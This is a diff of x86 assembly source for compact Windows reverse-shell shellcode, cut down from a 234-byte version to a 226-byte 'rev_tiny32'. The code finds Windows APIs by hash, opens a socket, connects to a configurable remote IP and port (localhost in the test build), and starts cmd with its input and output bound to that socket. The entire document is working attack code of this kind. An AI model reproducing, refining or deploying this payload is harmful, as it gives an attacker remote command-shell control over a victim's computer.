@@ -26,9 +26,9 @@
   ; Testing: jwasm -DTEST_CODE -I .\WinInc208\include -coff rev_overlap32.asm
   ;          link /subsystem:console rev_overlap32.obj
   ;
-  ; Binary:  jwasm -I .\WinInc208\include -bin rev_overlap32.asm
+  ; Binary:  jwasm -I .\WinInc208\include -bin rev_tiny32.asm
   ;
-  ; binary size is 234 bytes
+  ; Size: 226 bytes
   ;
   .686
   .model flat, stdcall
@@ -44,7 +44,7 @@
   WIN32_LEAN_AND_MEAN equ 1
 
   include windows.inc
-  include winsock.inc
+  include winsock2.inc
 
   .list
   .cref
@@ -57,6 +57,8 @@
     exitm <((iNum shl iBits) and 0FFFFFFFFh) or (iNum shr (32-iBits))>
   endm
 
+  ;USE_16 equ 1
+  
   hashapi macro szApi
     local dwApi
 
@@ -76,8 +78,8 @@
   endm
 
   mhtons macro A:req
-    exitm <(((A and 00000FF00h) shr 8) or \
-           (((A and 0000000FFh) shl 8))) and 0FFFFFFFFh>
+    exitm <(((A and 0FF00h) shr 8) or \
+           (((A and 000FFh) shl 8))) and 0FFFFh>
   endm
 
   PUSHAD_STRUCT struc
@@ -91,16 +93,43 @@
     _eax  dd  ?
   PUSHAD_STRUCT ends
 
-  .data
-  wsa WSADATA <>
+  IN4_ADDR  struct 
+    union S_un
+      struct S_un_b
+        s_b1  u_char  ?
+        s_b2  u_char  ?
+        s_b3  u_char  ?
+        s_b4  u_char  ?
+      ends
+    struct S_un_w
+      s_w1  u_short ?
+      s_w2  u_short ?
+    ends
+      S_addr  u_long  ?
+    ends
+  IN4_ADDR  ends
 
-  includelib kernel32.lib
-  includelib ws2_32.lib
+  PIN_ADDR typedef ptr IN_ADDR
+  LPIN_ADDR typedef ptr IN_ADDR
 
-  STACK_SIZE equ sizeof(PROCESS_INFORMATION) \
-               + sizeof(STARTUPINFO)         \
-               + sizeof(SOCKADDR_IN)         \
-               + 4*4
+  sockaddr_in4  struct 
+    sin_family  SWORD ?
+    sin_port    WORD  ?
+    sin_addr    IN4_ADDR  <>
+    ;sin_zero    SBYTE 8 dup (?)
+  sockaddr_in4  ends
+  
+  ifdef TEST_CODE
+    .data
+      wsa          WSADATA             <>
+      process_info PROCESS_INFORMATION <>
+      startup_info STARTUPINFO         <>
+      cmd_line     db "cmd", 0
+  
+    includelib kernel32.lib
+    includelib ws2_32.lib
+  endif
+  
   .code
 
 entrypoint:
@@ -117,100 +146,97 @@ ifdef TEST_CODE
     call   ExitProcess
 endif
 code_start:
+    pushad
     jmp    load_data
 calc_position:
-    pop    esi                    ; esi has pointer to our hashes
-                                 ; load relative address of our API retrieval routine
+    pop    esi
     lea    ebp, [esi + (offset get_proc_address - offset data_section)]
+    xor    eax, eax
+    cdq
+    mov    dl, sizeof (STARTUPINFO) + 4*5 ; 4 params to WSASocketA + ptr to "cmd"
 
-    xor    eax, eax               ; eax = 0
-    cdq                          ; edx = 0
-    mov    dl, STACK_SIZE
-
-    sub    esp, edx               ; first, reserve stack space for api parameters
-    mov    edi, esp               ; store stack pointer in edi so we can use stosd instruction
-    mov    ecx, edx               ; set size of data to initialize
-    rep    stosb                  ; zero fill
+    sub    esp, edx
+    mov    edi, esp
+    mov    ecx, edx
+    rep    stosb
 
     push   SOCK_STREAM
     push   AF_INET
-    call   ebp                    ; WSASocketA
-    xchg   eax, ebx               ; save socket
-
-    mov    eax, not REMOTE_IP
-    not    eax
-    push   eax
-    
-    mov    eax, not (((mhtons(REMOTE_PORT)) shl 16) or AF_INET)
-    not    eax
-    push   eax
-    
-    mov    eax, esp               ; sockaddr_in
-
-    push   sizeof (SOCKADDR_IN)
-    push   eax                    ; &sin
-    push   ebx                    ; s
-    call   ebp                    ; connect
-
-    add    esp, sizeof (SOCKADDR_IN) ; free stack space
-
-    push   ebx                    ; parameter to closesocket
+    call   ebp          ; WSASocketA, 4 params removed
     xchg   eax, ebx
-
-    lea    ebx, [edi - ( sizeof(PROCESS_INFORMATION) + sizeof(STARTUPINFO) )]
-    lea    edi, [ebx][STARTUPINFO.hStdInput]
-    inc    dword ptr[ebx][STARTUPINFO.dwFlags+1]
-
-    stosd                        ; si.hStdInput
-    stosd                        ; si.hStdOutput
-    stosd                        ; si.hStdError
-
-    cdq
+    
+    mov    edi, esp
+    push   16
+    push   edi
+    push   ebx
+    lodsd             
+    not    eax
+    stosd           ; store sin_family + sin_port
+    lodsd
+    not    eax      ; store sin_addr
+    stosd
+    call   ebp      ; connect
+    
+    mov    edi, esp
+    push   sizeof (STARTUPINFO) 
+    pop    dword ptr [edi][STARTUPINFO.cb]
+    mov    dword ptr [edi][STARTUPINFO.lpReserved], eax
+    inc    dword ptr [edi][STARTUPINFO.dwFlags+1]
+    xchg   eax, ebx
+    lea    edi, [edi][STARTUPINFO.hStdInput]
+    stosd
+    stosd
+    stosd
+    xchg   eax, ebx
+    
     mov    eax, not 'dmc'
     not    eax
-    push   eax
+    cdq
+    mov    ecx, edi
+    stosd
     mov    eax, esp
     
-    push   edi                     ; &pi
-    push   ebx                     ; &si
-
-    push   edx
-    push   edx
-    push   edx
-    push   eax                     ; TRUE
-    push   edx                     ; 0
-    push   edx                     ; 0
-    push   eax                     ; "cmd", 0
-    push   edx                     ; 0
-    call   ebp                     ; CreateProcessA
-    pop    eax
+    push   eax       ; lpProcessInformation
+    push   eax       ; lpStartupInfo
+    push   edx       ; lpCurrentDirectory=NULL
+    push   edx       ; lpEnvironment=NULL
+    push   edx       ; dwCreationFlags=0
+    push   ecx       ; bInheritHandles=TRUE
+    push   edx       ; lpThreadAttributes=NULL
+    push   edx       ; lpProcessAttributes=NULL
+    push   ecx       ; lpCommandLine
+    push   edx       ; lpApplicationName
+    call   ebp       ; CreateProcessA
+   
+    mov    eax, [esp]
+    push   INFINITE
+    push   eax
+    call   ebp       ; WaitForSingleObject
+   
+    push   ebx   
+    call   ebp       ; closesocket
     
-    push   INFINITE                ; INFINITE
-    push   dword ptr[edi][PROCESS_INFORMATION.hProcess]
-    call   ebp                     ; WaitForSingleObject
-    
-    push   dword ptr[edi][PROCESS_INFORMATION.hThread]
-    call   ebp                     ; CloseHandle
-    
-    push   dword ptr[edi][PROCESS_INFORMATION.hProcess]
-    call   ebp                     ; CloseHandle
-    
-    call   ebp                     ; closesocket
-    
-    add    esp, sizeof (PROCESS_INFORMATION) + \
-                sizeof (STARTUPINFO)  ; free stack space
+    ; fix up stack/registers and return
+    add    esp, sizeof (STARTUPINFO) + 4
+    popad
     ret
-
+    
 load_data:
     call calc_position
 ; not really data section as we're in same segment
 data_section label dword
     hashapi "WSASocketA"
+ifdef TEST_CODE
+; 127.0.0.1:80
+    remote_addr sockaddr_in4 <not AF_INET, \
+                  not mhtons(REMOTE_PORT), \
+      <<<not 7fh, not 00h, not 00h, not 01h>>>>
+else
+    remote_addr sockaddr_in4 <>
+endif
     hashapi "connect"
     hashapi "CreateProcessA"
     hashapi "WaitForSingleObject"
-    hashapi "CloseHandle"
-    hashapi "CloseHandle"
     hashapi "closesocket"
 
 get_proc_address proc near
@@ -228,21 +254,21 @@ load_dll:
     lodsd
     push   eax
 
-    mov    eax, [ebp+3Ch]      ; IMAGE_DOS_HEADER.e_lfanew
-    mov    eax, [ebp+eax+78h]  ; IMAGE_NT_HEADERS.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
-    lea    esi, [ebp+eax+18h]  ; IMAGE_EXPORT_DIRECTORY.NumberOfNames
+    mov    eax, [ebp+3Ch]
+    mov    eax, [ebp+eax+78h] 
+    lea    esi, [ebp+eax+18h]
     lodsd
     xchg   eax, ecx
     jecxz  load_dll
 
-    lodsd                   ; IMAGE_EXPORT_DIRECTORY.AddressOfFunctions
+    lodsd
     add    eax, ebp
     push   eax
 
-    lodsd                   ; IMAGE_EXPORT_DIRECTORY.AddressOfNames
+    lodsd
     lea    edi, [ebp+eax]
 
-    lodsd                   ; IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals
+    lodsd
     lea    ebx, [ebp+eax]
 load_api:
     mov    esi, [edi+4*ecx-4]
